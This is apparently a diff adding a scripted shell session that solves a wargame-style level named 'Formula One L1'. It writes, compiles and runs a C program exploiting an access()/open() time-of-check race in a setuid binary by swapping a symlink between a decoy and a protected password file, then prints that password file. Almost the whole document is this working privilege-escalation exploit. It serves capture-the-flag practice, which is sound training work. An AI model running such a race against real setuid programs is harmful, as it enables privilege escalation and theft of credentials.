@@ -1,0 +1,61 @@
+@sleep 1
+id
+echo '# Formula One L1: /formulaone/formulaone1 (setuid formulaone1):'
+cat /formulaone/formulaone1.c
+ls -la /formulaone/formulaone1
+echo '# access(argv[1],R_OK) runs as formulaone0 (real uid) but open() as formulaone1'
+echo '# (setuid euid) -> classic access/open TOCTOU: race a symlink between a readable'
+echo '# decoy and /etc/formulaone_pass/formulaone1.'
+echo '# Writing the racer (heredoc, code visible):'
+@line cat > /tmp/racer.c <<'CEOF'
+@line /* toggle target between decoy and the password file; fork the setuid
+@line    binary per round; drain the pipe to EOF so partial decoy reads
+@line    (e.g. "r") cannot be mistaken for a password hit. */
+@line #include <stdio.h>
+@line #include <unistd.h>
+@line #include <string.h>
+@line #include <sys/wait.h>
+@line int main(void) {
+@line     char out[512];
+@line     for (long iter = 0; iter < 200000; iter++) {
+@line         unlink("target");
+@line         symlink("decoy", "target");
+@line         pid_t p = fork();
+@line         if (p == 0) {
+@line             symlink("/etc/formulaone_pass/formulaone1", "swap_tmp");
+@line             rename("swap_tmp", "target");
+@line             _exit(0);
+@line         }
+@line         int fds[2]; pipe(fds);
+@line         pid_t q = fork();
+@line         if (q == 0) {
+@line             dup2(fds[1], 1); close(fds[0]); close(fds[1]);
+@line             execl("/formulaone/formulaone1", "formulaone1", "target", (char*)0);
+@line             _exit(127);
+@line         }
+@line         close(fds[1]);
+@line         int n = 0, t;
+@line         while ((t = read(fds[0], out+n, sizeof(out)-1-n)) > 0) n += t;
+@line         close(fds[0]);
+@line         if (n > 0) {
+@line             out[n] = 0;
+@line             if (strstr(out, "readable") == NULL && strlen(out) > 10) {
+@line                 printf("HIT iter %ld: %s\n", iter, out);
+@line                 fflush(stdout);
+@line             }
+@line         }
+@line         waitpid(p, NULL, 0);
+@line         waitpid(q, NULL, 0);
+@line     }
+@line     return 0;
+@line }
+@line CEOF
+mkdir -p /tmp/race && cd /tmp/race && echo readable > decoy
+gcc /tmp/racer.c -o racer
+echo '# run the race:'
+timeout 240 ./racer | head -1
+echo rc=$?
+echo '# Verify the password (we are formulaone1 after the ssh login):'
+cat /etc/formulaone_pass/formulaone1
+@sleep 2
+exit
